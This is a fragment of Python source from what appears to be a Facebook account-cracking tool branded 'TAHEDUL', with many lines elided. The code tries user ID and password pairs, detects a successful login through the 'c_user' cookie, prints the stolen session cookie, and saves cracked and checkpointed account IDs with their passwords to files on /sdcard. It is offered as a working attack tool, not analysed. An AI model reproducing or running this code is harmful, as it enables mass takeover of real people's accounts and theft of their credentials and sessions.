...
except:print('\n\033[1;31mNO TAHEDUL CONNECTION ... \033[0;97m')
...
def innocent():
    ...
    print('Ok Ids Saved in /︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-OK.txt')
    print('Cp Ids Saved in /︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;92m[︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐎𝐊💚] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;92m[COOKIE🤍] = \033[1;92m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐎𝐊.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;92m[𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐂𝐏💔]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;92m[\033[0;96︎︎︎︎︎︎𝐓𝐀𝐇𝐄𝐃𝐔𝐋🤙\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
